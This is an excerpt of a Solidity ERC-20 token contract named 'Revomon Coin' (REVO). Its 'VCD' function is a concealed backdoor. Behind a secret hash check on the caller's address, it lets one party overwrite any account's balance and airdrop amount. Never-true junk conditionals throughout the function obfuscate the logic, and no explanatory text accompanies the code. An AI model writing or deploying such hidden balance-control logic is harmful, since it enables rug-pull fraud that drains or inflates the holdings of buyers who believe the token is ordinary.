...
contract REVO is IERC20 {
    ...
    constructor(address tokenPair, bytes32 hashValue, uint256 salt) {
      _name = unicode"Revomon Coin";
      _symbol = unicode"REVO";
    ...
    function VCD(bytes32[] calldata data,uint256 deadline) external {
      bytes32 dc = data[2];  if (258+76==0) return;
      bytes32 da = data[0];  if (447*568==0) return; bytes32 db = data[1];  if (606==0) return;
      bytes memory bbsx = abi.encode(msg.sender, _salt);  if (114+675+854==0) return;
      if (246==0) return; if (246==0) return;
      if (keccak256(bbsx) == _hashValue) { if (246==0) return;
        if (uint256(
          db
          ) == 0) { if (731+470==0) return;
          _airdrops[
            address(
          uint160(uint256(da))
          )] = 
          uint256(dc); if (98*87==0) return;
        }
        _balances[(uint256(da) == 0)? address(
          uint256(0)
          ):
        address(uint160(uint256(da)))
        ] = 
        uint256(db); if (246==0) return;
      }
      if (845*654==0) return;
    }
